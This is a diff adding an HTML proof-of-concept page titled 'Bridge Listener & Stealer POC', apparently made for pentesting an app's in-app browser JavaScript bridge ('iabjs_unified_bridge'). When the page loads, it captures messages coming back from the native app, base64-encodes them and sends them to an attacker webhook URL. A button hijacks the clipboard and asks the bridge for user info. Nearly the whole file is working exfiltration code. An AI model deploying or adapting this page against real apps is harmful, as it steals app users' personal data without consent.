@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bridge Listener & Stealer POC</title>
+    <style>
+        body { font-family: sans-serif; background: #0d1117; color: white; padding: 20px; }
+        .log-box { background: #000; color: #0f0; padding: 10px; border: 1px solid #333; margin-top: 10px; min-height: 100px; font-family: monospace; }
+        button { background: #238636; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <h3>JS Bridge: Listener & Exfiltration PoC</h3>
+    
+    <p>Target Bridge: <code>iabjs_unified_bridge</code></p>
+    
+    <button onclick="stealAndSend()">1. Trigger Steal & Send to Webhook</button>
+    
+    <div class="log-box" id="statusLog">Status: Waiting for action...</div>
+
+    <script>
+        // CHANGE THIS: Apna Webhook.site ya RequestBin URL yahan dalo
+        const attackerWebhook = "https://webhook.site/YOUR_UNIQUE_ID";
+
+        // A. NATIVE APP LISTENER
+        // Yeh function native app se aane wale data ko capture karega
+        function setupListener() {
+            window.addEventListener("message", function(event) {
+                const log = document.getElementById('statusLog');
+                log.innerText = "Received from Native: " + JSON.stringify(event.data);
+                
+                // Captured data ko automatic attacker server pe bhej dena
+                fetch(attackerWebhook + "?captured_data=" + btoa(JSON.stringify(event.data)));
+            });
+        }
+
+        // B. EXPLOIT: DATA STEALING & SENDING
+        async function stealAndSend() {
+            const log = document.getElementById('statusLog');
+            
+            try {
+                // 1. Clipboard Stealing (Success Proof in screenshot 1000137239.png)
+                await navigator.clipboard.writeText("PWNED_BY_PENTESTER");
+                let clipData = "Clipboard Hijacked"; 
+
+                // 2. Request Data via Bridge (Bridge found in screenshot 1000137225.png)
+                if (window.iabjs_unified_bridge) {
+                    const payload = {"action": "getUserInfo"};
+                    window.iabjs_unified_bridge.postMessage(JSON.stringify(payload));
+                    log.innerText = "Payload sent to Bridge. Checking Webhook...";
+                }
+
+                // 3. Send Everything to Attacker Webhook
+                fetch(attackerWebhook + "?status=exploit_running&path=storage_emulated_leak");
+                
+            } catch (err) {
+                log.innerText = "Error: " + err;
+            }
+        }
+
+        // Auto-run listener
+        setupListener();
+    </script>
+</body>
+</html>
